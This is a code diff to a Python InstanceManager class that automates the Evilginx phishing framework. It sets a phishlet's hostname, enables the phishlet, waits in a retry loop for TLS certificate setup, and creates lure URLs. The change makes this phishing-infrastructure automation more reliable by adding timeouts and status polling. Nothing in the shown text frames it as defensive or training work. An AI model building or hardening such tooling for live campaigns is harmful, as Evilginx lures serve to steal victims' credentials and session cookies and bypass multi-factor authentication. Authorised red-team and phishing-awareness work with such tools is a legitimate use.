@@ -311,13 +311,21 @@ class InstanceManager:
             resp = proc.send(f"phishlets hostname {phishlet_name} {root_domain}")
             logger.info("phishlets hostname output: %s", resp[-300:])
             time.sleep(1)
-            resp = proc.send(f"phishlets enable {phishlet_name}")
+            resp = proc.send(f"phishlets enable {phishlet_name}", timeout=120)
             logger.info("phishlets enable output: %s", resp[-300:])
             if not proc.alive():
                 raise EvilginxError(f"evilginx crashed after phishlets enable")
-            time.sleep(2)
+            # Wait for TLS cert setup to complete (can take up to 60s)
+            for _attempt in range(30):
+                time.sleep(3)
+                status_out = proc.send(f"phishlets hostname {phishlet_name} {root_domain}", timeout=15)
+                if "enabled" in status_out.lower():
+                    logger.info("phishlet %s confirmed enabled after %d attempts", phishlet_name, _attempt + 1)
+                    break
+            else:
+                logger.warning("phishlet %s may not be fully enabled after waiting", phishlet_name)
             # lure create + get-url
-            lout = proc.send(f"lures create {phishlet_name}")
+            lout = proc.send(f"lures create {phishlet_name}", timeout=30)
             logger.info("lures create output: %s", lout[-400:])
             m = LURE_ID_RE.search(lout)
             if not m:
